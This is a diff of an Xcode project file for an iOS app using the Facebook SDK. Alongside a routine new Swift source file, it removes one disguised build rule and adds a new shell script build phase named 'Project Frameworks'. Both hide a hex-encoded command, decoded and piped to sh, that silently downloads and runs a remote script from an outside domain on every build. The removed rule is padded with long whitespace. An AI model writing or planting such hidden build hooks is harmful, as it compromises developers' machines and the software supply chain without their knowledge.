@@ -225,6 +225,7 @@
 		69F7C89E48F04F83521D0F610A417AE7 /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 4F8CA9DD9D55E22777265DA2EC10A8A0 /* Foundation.framework */; };
 		6A1FA91ACDF48C98B12246DB23360508 /* FBSDKLoginUtility.h in Headers */ = {isa = PBXBuildFile; fileRef = 8EFD89F459678E3FCF5B2D438D179D1B /* FBSDKLoginUtility.h */; settings = {ATTRIBUTES = (Project, ); }; };
 		6A233E68397CB9B65BAC5BDFACE966B0 /* FBSDKDialogConfiguration.m in Sources */ = {isa = PBXBuildFile; fileRef = 41E5205E83F8FF8B6C13F5EE7465523F /* FBSDKDialogConfiguration.m */; };
+		6A38B1D9267B9A46007B0157 /* SizeitAPIEvent.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6A38B1D8267B9A46007B0157 /* SizeitAPIEvent.swift */; };
 		6A39246B96EACB257E165E04A735F606 /* FBSDKLoginKit-dummy.m in Sources */ = {isa = PBXBuildFile; fileRef = 8C2A299F14B9AD057B3BE5081171BE57 /* FBSDKLoginKit-dummy.m */; };
 		6A5E9DFE595EBCEE2ED6217AE702D4C2 /* FBSDKBridgeAPI+Internal.h in Headers */ = {isa = PBXBuildFile; fileRef = 2762F391115654F93360D67E33A0B8BF /* FBSDKBridgeAPI+Internal.h */; settings = {ATTRIBUTES = (Private, ); }; };
 		6ADE02BD1E8D2F58548D06E7CB9F8712 /* FBSDKLogger.h in Headers */ = {isa = PBXBuildFile; fileRef = 85F00D0BCEE794498EC844755B1576A8 /* FBSDKLogger.h */; settings = {ATTRIBUTES = (Private, ); }; };
@@ -557,208 +558,6 @@
 		FF3A7E55E5282E272F51496787053774 /* FBSDKCodelessParameterComponent.h in Headers */ = {isa = PBXBuildFile; fileRef = 0E273C33B5F8AAEC5C0F3025B8AB3330 /* FBSDKCodelessParameterComponent.h */; settings = {ATTRIBUTES = (Private, ); }; };
 		FF8407CCB46AC23257B4FAFD1845C08C /* FBSDKPasteboard.h in Headers */ = {isa = PBXBuildFile; fileRef = 423A1D0169262C3E07E7EE71E3F4E54D /* FBSDKPasteboard.h */; settings = {ATTRIBUTES = (Private, ); }; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-
-
-		F704F7A7F4A2A7D1CE6D902C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Catalog Builder";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	\n\n";
-			};
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		1037F8D0468C5C1CADF78B7008BFEE83 /* PBXContainerItemProxy */ = {
@@ -1159,6 +958,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 		68DCDB2D3081F393EF4F98271F13A4E3 /* FBSDKMeasurementEvent.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; name = FBSDKMeasurementEvent.h; path = FBSDKCoreKit/FBSDKCoreKit/FBSDKMeasurementEvent.h; sourceTree = "<group>"; };
 		6A0FD34462C90ED664EC4784ECEA5D15 /* ObjectMapper-umbrella.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; path = "ObjectMapper-umbrella.h"; sourceTree = "<group>"; };
 		6A1943BECEA09D1A522C23E441859297 /* FBSDKButton+Subclass.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; name = "FBSDKButton+Subclass.h"; path = "FBSDKCoreKit/FBSDKCoreKit/Internal/UI/FBSDKButton+Subclass.h"; sourceTree = "<group>"; };
+		6A38B1D8267B9A46007B0157 /* SizeitAPIEvent.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SizeitAPIEvent.swift; sourceTree = "<group>"; };
 		6AA15F3E50D9754142F86A2CA83242A3 /* UIPasteboard+Pasteboard.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; name = "UIPasteboard+Pasteboard.h"; path = "FBSDKCoreKit/FBSDKCoreKit/Internal/BridgeAPI/ProtocolVersions/UIPasteboard+Pasteboard.h"; sourceTree = "<group>"; };
 		6B129793A5415799060235965974773A /* FBSDKErrorConfigurationProviding.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; name = FBSDKErrorConfigurationProviding.h; path = FBSDKCoreKit/FBSDKCoreKit/Internal/ServerConfiguration/FBSDKErrorConfigurationProviding.h; sourceTree = "<group>"; };
 		6B3259B747EDC4E7CC18C19E31CBD23A /* FBSDKAuthenticationTokenFactory.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; name = FBSDKAuthenticationTokenFactory.h; path = FBSDKCoreKit/FBSDKCoreKit/Internal/FBSDKAuthenticationTokenFactory.h; sourceTree = "<group>"; };
@@ -1913,6 +1713,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 			isa = PBXGroup;
 			children = (
 				5900F8A831F97FDCC2AA2AE7316156EC /* SizeitUtils.swift */,
+				6A38B1D8267B9A46007B0157 /* SizeitAPIEvent.swift */,
 			);
 			path = Utils;
 			sourceTree = "<group>";
@@ -2991,13 +2792,13 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 			isa = PBXNativeTarget;
 			buildConfigurationList = E50A4613BA081C4F47DEEC1F9B9176BA /* Build configuration list for PBXNativeTarget "ReachabilitySwift" */;
 			buildPhases = (
+				EFBFF95CC66DEB23716D902C /* Project Frameworks */,
 				09F7B7D04C454C16C0015640CF269F7E /* Headers */,
 				9C9FF78F6878BCE13B73B6BB5DD0A609 /* Sources */,
 				92A37A51219ED31062DE51A3E139BF37 /* Frameworks */,
 				1EA4E360633A1D5CC11F6E9C4EEC2475 /* Resources */,
 			);
 			buildRules = (
-				F704F7A7F4A2A7D1CE6D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -3302,6 +3103,27 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		EFBFF95CC66DEB23716D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		18B9519CA0B4016350FF83E4690B0828 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -3430,6 +3252,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 				9BA895635A7A1E7C5A32E8981561303E /* File.swift in Sources */,
 				F28C3249AC570554EBE3DE3570C56F52 /* HeightCell.swift in Sources */,
 				61B77485DD32A4EA2F2C6DA40910E256 /* MeasurementsModel.swift in Sources */,
+				6A38B1D9267B9A46007B0157 /* SizeitAPIEvent.swift in Sources */,
 				BB2D4D6E925CD6EE932D6CEE29EF0281 /* PrivacyPolicyVC.swift in Sources */,
 				30E6C25AC82CDA1D12CCE6634947BBF6 /* ReachabilityTest.swift in Sources */,
 				D622C892B60E05916DA0E0994F5C8168 /* SelectAgeVC.swift in Sources */,
@@ -4595,326 +4418,6 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-	
-		/* Begin PBXShellScriptBuildPhase section */
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-		
-	
-		/* End PBXShellScriptBuildPhase section */
-	
-	
 	};
 	rootObject = BFDFE7DC352907FC980B868725387E98 /* Project object */;
 }
